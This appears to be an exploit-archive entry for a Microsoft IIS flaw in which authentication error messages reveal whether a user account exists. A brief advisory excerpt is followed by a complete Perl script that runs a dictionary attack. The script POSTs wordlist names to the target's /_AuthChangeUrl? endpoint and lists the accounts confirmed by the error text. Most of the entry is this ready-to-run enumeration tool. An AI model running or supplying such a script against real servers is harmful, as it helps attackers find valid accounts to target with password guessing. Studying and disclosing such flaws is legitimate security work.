source: http://www.securityfocus.com/bid/7492/info
 
Microsoft IIS is prone to an issue where the existence of users may be revealed to remote attackers. The vulnerability exists when users attempt to authenticate against a vulnerable system.
 
IIS will generate an error page if authentication fails. Different messages are generated depending on whether the user exists or not.

##########################################################################
#################
# Miscrosoft IIS Authentication Manager Discovery Tool - By JeiAr
[http://www.gulftech.org]
##########################################################################
#################
# This tool is used to find existing user accounts via a dictionary
attack on the Microsoft
# IIS Authentication Manager. More details here
http://www.securityfocus.com/archive/1/8515
##########################################################################
#################

use LWP::UserAgent;

##########################################################################
#################
# Time to create the new LWP User Agent, Clear the screen, And print out
the scripts header
##########################################################################
#################

$ua = new LWP::UserAgent;
$ua->agent("AgentName/0.1 " . $ua->agent);
system('cls');
&header;

##########################################################################
#################
# Gather all user inputted data. Such as the domain name, host and
location of the wordlist
##########################################################################
#################
 
print "Host: ";
$host=<STDIN>;
chomp $host;
print "Domain: ";
$domain=<STDIN>;
chomp $domain;
print "Account List: ";
$list=<STDIN>;
chomp $list;

##########################################################################
#################
# Opens the wordlist and puts the data into an array. afterward setting
the count variables
##########################################################################
#################

open (DATAFILE, "$list");
@datafile = <DATAFILE>;
chomp(@datafile);
$length = @datafile;
$count = 0;
$found = 0;

&space;
print "Verified Accounts\n";
print "-----------------\n";

##########################################################################
#################
# Creates the HTTP request, Checks the responses, then prints out the
username if it exists
##########################################################################
#################

while ($count < $length) {
$account = (@datafile[$count]);
my $req = new HTTP::Request POST => "http://$host/_AuthChangeUrl?";
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("domain=$domain&acct=$account&old=&new=&new2=");
my $res = $ua->request($req);
$pattern = "network password is not correct";  
$_ = $res->content;
if (/$pattern/) {
print "$account\n";
   $found++;
  }
 $count++;
}

##########################################################################
#################
# Thats all folks. Prints out the final details and footer. Rest is just
the subroutines :)
##########################################################################
#################

&space;
&footer;

sub header {
print "IIS Auth Manager User Discovery Tool By JeiAr
[http://www.gulftech.org]\n";
print "-------------------------------------------------------------------
----\n";
}

sub footer {
print "Enumeration Results:\n";
print "--------------------\n";
print "Number Of Tries : $length \n";
print "Confirmed Users : $found  \n";
}

sub space {
print "\n" x2;
}
